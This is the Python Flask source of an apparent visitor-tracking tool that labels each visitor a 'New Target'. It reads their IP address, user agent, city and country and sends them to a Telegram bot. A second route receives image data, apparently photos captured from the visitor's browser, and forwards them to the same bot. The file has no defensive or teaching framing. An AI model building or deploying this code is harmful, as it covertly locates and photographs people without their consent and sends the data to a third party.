import os
import json
from flask import Flask, render_template, request
from module.location.lo import get_location
from module.Telegram.API import Tel
from module.Photo.PA import Ph

TEXT = json.loads(open('json/text.json').read())

ip = get_location()

Telegram = Tel()

Photo = Ph()

app = Flask(__name__, template_folder="template", static_folder="static")

@app.route("/")
def data():
    global ip, Telegram
    ip_addr = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    user = request.user_agent
    result = ip.iploc(ip_address=ip_addr)

    text = f"""New Target🛢️
    👽ip : <{ip_addr}>

    🪪user_agent: <{user}>

    🏙️city: <{result["city"]}>

    🩻country_name: <{result["country_name"]}>
    """
    Telegram.send_message(text=text, BOT_TOKEN=TEXT["bot"], CHAT_ID=TEXT["id"])

    return render_template("index.html")

@app.route('/upload', methods=['GET', 'POST'])
def parse_request():
    global Telegram, Photo
    data = request.data
    Photo.process_image_data(data.decode("utf-8"))
    Telegram.send_photo(TEXT["bot"], TEXT["id"], TEXT["path"])
    os.remove("emboy.jpg")
    if data:
        return "ok"

if __name__ == '__main__':
    app.run()
